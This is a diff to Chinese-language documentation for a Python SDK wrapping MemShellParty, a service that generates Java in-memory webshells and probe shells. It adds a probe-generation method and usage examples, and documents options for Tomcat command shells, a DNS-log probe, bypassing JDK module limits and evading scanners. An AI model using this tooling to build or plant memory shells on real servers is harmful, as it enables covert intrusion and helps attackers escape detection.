@@ -88,6 +88,9 @@ client = MemShellParty(base_url="http://127.0.0.1:8080", timeout=120)
 | `get_packers_tree()` | 查询可用 packer 树（打包格式） |
 | `get_command_configs()` | Command 工具可用的加密器 / 执行实现 |
 | `generate(body=None, **kwargs)` | 生成内存马并打包，返回完整 JSON |
+| `generate_probe(body=None, **kwargs)` | 生成探测马并打包，返回完整 JSON |
+
+`generate(probe=True)` 只是内存马生成里的**回显探测开关**（把注入器放进回显马，便于非本地确认）。`generate_probe` 走独立接口 `POST /api/probe/generate`，生成的是探测马，不是同一种产物。
 
 ### 先查再生成（推荐）
 
@@ -182,7 +185,7 @@ client.generate(
 | `debug` | shellConfig.debug | 注入器打印注入信息，Shell 打印异常堆栈 |
 | `by_pass_java_module` | shellConfig.byPassJavaModule | 绕过 JDK9+ 模块限制（Unsafe defineClass） |
 | `shrink` | shellConfig.shrink | 缩小字节码（ASM SKIP_DEBUG）；默认 True |
-| `probe` | shellConfig.probe | 回显探测：把注入器放入回显马，便于非本地确认 |
+| `probe` | shellConfig.probe | 内存马回显探测开关（不是 `generate_probe`） |
 | `lambda_suffix` | shellConfig.lambdaSuffix | 类名追加 `$Proxy0$$Lambda$1`，利于绕过部分扫描 |
 | `url_pattern` | injectorConfig.urlPattern | 挂载/匹配 URL，默认 `/*` |
 | `injector_class_name` | injectorConfig.injectorClassName | 注入器全限定类名；空则随机 |
@@ -231,6 +234,38 @@ from wtfutil.memshellutil import extract_generate_meta
 
 meta = extract_generate_meta(result)
 # shellClassName / injectorClassName / shellToolConfig / hasPackResult ...
+```
+
+---
+
+## generate_probe：探测马
+
+`generate_probe` 调用 `POST /api/probe/generate`。默认对齐官方探测页：`method=ResponseBody`、`content=Command`、`shrink=True`、`static_initialize=True`、`seconds=5`、`server=Tomcat`。`jre` 换算与 `generate` 相同（默认 6；class ≥53 时自动 `byPassJavaModule=True`）。
+
+`method` / `content` 在已知名称内不区分大小写。SDK **不校验**二者组合；非法组合由服务端报 `MemShellPartyError`。空的 `host` / `req_param_name` / `command_template` 不会写入 JSON。
+
+```python
+from wtfutil.memshellutil import MemShellParty, extract_probe_meta
+
+with MemShellParty() as client:
+    result = client.generate_probe(
+        method="ResponseBody",
+        content="Command",
+        jre=9,
+    )
+    payload = result["packResult"]
+    info = result["probeShellResult"]
+    print(info["shellClassName"], info["shellSize"])
+    meta = extract_probe_meta(result)
+```
+
+也可只组装请求体：
+
+```python
+from wtfutil.memshellutil import build_probe_body
+
+req = build_probe_body(method="dnslog", content="server", host="x.example.test", jre=9)
+result = client.generate_probe(body=req)
 ```
 
 ---
@@ -336,10 +371,12 @@ except MemShellPartyError as e:
 | `KNOWN_SERVERS` / `KNOWN_SHELL_TOOLS` / `KNOWN_SHELL_TYPES` | 大小写归一用的已知名称表 |
 | `canonicalize_server` / `canonicalize_shell_tool` / `canonicalize_shell_type` | 单独归一化 |
 | `memshell_config` | 运行时配置 dict（`BASE_URL`） |
-| `build_generate_body(...)` | 只组装请求体，不发 HTTP |
+| `build_generate_body(...)` | 只组装内存马请求体，不发 HTTP |
+| `build_probe_body(...)` | 只组装探测马请求体，不发 HTTP |
 | `resolve_jre_class_version(...)` | 将 `jre`/发行版或 class 主版本统一为 API 数字 |
 | `resolve_shell_credentials(...)` | 将 `password`/`key` 映射到专用凭证字段 |
-| `extract_generate_meta(result, output=...)` | 从响应提取紧凑 meta |
+| `extract_generate_meta(result, output=...)` | 从内存马响应提取紧凑 meta |
+| `extract_probe_meta(result, output=...)` | 从探测马响应提取紧凑 meta |
 | `MemShellPartyError` | API / 协议错误 |
 
 ---
